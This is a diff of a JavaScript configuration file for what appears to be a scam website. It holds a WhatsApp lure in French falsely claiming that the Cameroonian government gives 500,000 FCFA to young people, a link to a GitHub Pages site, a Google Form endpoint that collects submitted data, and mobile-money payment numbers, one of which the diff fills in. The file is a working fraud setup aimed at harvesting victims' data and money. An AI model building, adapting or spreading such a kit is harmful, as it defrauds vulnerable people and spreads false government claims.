@@ -1,7 +1,7 @@
 // Configuration - UPDATE THESE WITH YOUR NUMBERS
 const CONFIG = {
     orangeMoneyNumber: "6XX XXX XXX", // ← CHANGE THIS TO YOUR ORANGE MONEY NUMBER
-    mtnMoneyNumber: "6XX XXX XXX",    // ← CHANGE THIS TO YOUR MTN MONEY NUMBER
+    mtnMoneyNumber: "673 272 421",    // ← CHANGE THIS TO YOUR MTN MONEY NUMBER
     whatsappMessage: "Le Gouvernement Camerounais donne 500,000 FCFA aux jeunes. Je viens de faire ma demande. Dépêche-toi avant la fin du quota! 👇 https://js6124669-wq.github.io/subvention-jeunes/",
     googleFormURL: "https://forms.gle/LMUpDEBZrx6sJ9BYA/formResponse" // ← TU VAS METTRE TON LIEN GOOGLE FORM ICI
 };
@@ -236,4 +236,5 @@ function sendToGoogleForm(data, isFinal = false) {
 }
 
 // Initialize the application when page loads
+
 document.addEventListener('DOMContentLoaded', init);
